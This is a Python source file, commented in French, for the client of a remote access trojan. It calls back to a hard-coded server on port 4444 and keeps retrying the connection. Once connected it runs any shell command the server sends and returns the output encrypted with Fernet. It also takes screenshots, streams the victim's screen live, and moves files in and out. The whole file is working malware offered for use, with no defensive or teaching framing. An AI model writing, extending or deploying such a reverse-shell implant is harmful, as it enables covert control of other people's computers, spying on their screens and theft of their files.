import socket
import subprocess
import platform
import time
from cryptography.fernet import Fernet
from PIL import Image, ImageGrab
from io import BytesIO

# Configuration du serveur codée en dur
SERVER_HOST = "ip"  # Remplacez par l'adresse IP de votre serveur
SERVER_PORT = 4444

def get_sysinfo():
    return f"""
Système : {platform.system()} {platform.release()}
Version : {platform.version()}
Machine : {platform.machine()}
Utilisateur : {platform.node()}
Adresse IP : {socket.gethostbyname(socket.gethostname())}
"""

def take_screenshot(client_socket, cipher):
    try:
        print("[*] Capture de l'écran...")
        screenshot = ImageGrab.grab()
        
        # Compresser en JPEG
        buffer = BytesIO()
        screenshot.save(buffer, format="JPEG", quality=70)
        img_data = buffer.getvalue()
        
        # Chiffrer les données
        encrypted_data = cipher.encrypt(img_data)
        
        # Envoyer la taille de l'image
        size = len(encrypted_data)
        print(f"[*] Envoi d'une image de {size} octets...")
        client_socket.send(f"{size:<16}".encode())
        
        # Envoyer l'image
        client_socket.send(encrypted_data)
        
        return "[*] Capture d'écran envoyée au serveur"
    except Exception as e:
        print(f"[!] Erreur lors de la capture d'écran : {e}")
        return f"[!] Erreur : {e}"

def stream_screen(client_socket, cipher):
    try:
        print("[*] Démarrage du streaming de l'écran vers le serveur...")
        FPS = 10  # Limiter à 10 images par seconde
        frame_interval = 1.0 / FPS
        while True:
            start_time = time.time()
            
            # Capturer l'écran
            screenshot = ImageGrab.grab()
            
            # Compresser en JPEG
            buffer = BytesIO()
            screenshot.save(buffer, format="JPEG", quality=50)
            img_data = buffer.getvalue()
            
            # Chiffrer les données
            encrypted_data = cipher.encrypt(img_data)
            
            # Envoyer la taille de l'image
            size = len(encrypted_data)
            client_socket.send(f"{size:<16}".encode())
            
            # Envoyer l'image
            client_socket.send(encrypted_data)
            
            # Vérifier si le serveur demande l'arrêt
            try:
                client_socket.settimeout(0.1)
                stop_signal = client_socket.recv(1024)
                if cipher.decrypt(stop_signal) == b"STOP_STREAM":
                    break
            except socket.timeout:
                pass
            except Exception as e:
                print(f"[!] Erreur lors de la vérification du signal d'arrêt : {e}")
                break
            
            # Contrôler la fréquence des captures
            elapsed_time = time.time() - start_time
            if elapsed_time < frame_interval:
                time.sleep(frame_interval - elapsed_time)

        return "[*] Streaming arrêté"
    except Exception as e:
        print(f"[!] Erreur lors du streaming : {e}")
        return f"[!] Erreur : {e}"

def send_file(client_socket, filename):
    try:
        with open(filename, "rb") as f:
            while True:
                data = f.read(1024)
                if not data:
                    client_socket.send(b"EOF")
                    break
                client_socket.send(data)
        return f"[*] Fichier {filename} envoyé"
    except Exception as e:
        print(f"[!] Erreur lors de l'envoi : {e}")
        return f"[!] Erreur : {e}"

def receive_file(client_socket, filename):
    try:
        with open(filename, "wb") as f:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                if data.endswith(b"EOF"):
                    f.write(data[:-3])
                    break
                f.write(data)
        return f"[*] Fichier {filename} reçu"
    except Exception as e:
        print(f"[!] Erreur lors de la réception : {e}")
        return f"[!] Erreur : {e}"

def start_client(retry_interval=5):
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            print(f"[*] Tentative de connexion à {SERVER_HOST}:{SERVER_PORT} | {time.ctime()}")
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            print(f"[*] Connecté à {SERVER_HOST}:{SERVER_PORT} | {time.ctime()}")

            # Recevoir la clé de chiffrement
            key = client_socket.recv(1024)
            if not key:
                print("[!] Erreur : clé de chiffrement non reçue")
                time.sleep(retry_interval)
                continue
            cipher = Fernet(key)

            while True:
                try:
                    encrypted_command = client_socket.recv(1024)
                    if not encrypted_command:
                        print("[!] Connexion interrompue par le serveur")
                        break
                    command = cipher.decrypt(encrypted_command).decode()
                    print(f"[*] Commande reçue : {command} | {time.ctime()}")

                    if command.lower() == 'exit':
                        print("[*] Déconnexion demandée")
                        break

                    if command == 'UPLOAD_READY':
                        result = receive_file(client_socket, "uploaded_file")
                        client_socket.send(cipher.encrypt(result.encode()))
                        continue

                    if command == 'DOWNLOAD_READY':
                        result = send_file(client_socket, "screenshot.png")
                        client_socket.send(cipher.encrypt(result.encode()))
                        continue

                    command_lower = command.lower().strip()

                    if command_lower == 'stream':
                        output = stream_screen(client_socket, cipher)
                        client_socket.send(cipher.encrypt(output.encode()))
                        continue

                    if command_lower == 'sysinfo':
                        output = get_sysinfo()
                    elif command_lower == 'screenshot':
                        output = take_screenshot(client_socket, cipher)
                    else:
                        try:
                            result = subprocess.run(command, shell=True, capture_output=True, text=True)
                            output = result.stdout + result.stderr
                            if not output:
                                output = "[*] Commande exécutée, pas de sortie."
                        except Exception as e:
                            output = f"[!] Erreur lors de l'exécution : {e}"

                    client_socket.send(cipher.encrypt(output.encode()))

                except Exception as e:
                    print(f"[!] Erreur lors du traitement de la commande : {e}")
                    break

        except Exception as e:
            print(f"[!] Erreur : {e} | {time.ctime()}")
            print(f"[*] Tentative de reconnexion dans {retry_interval} secondes...")
            time.sleep(retry_interval)
        
        finally:
            client_socket.close()

if __name__ == "__main__":
    start_client()
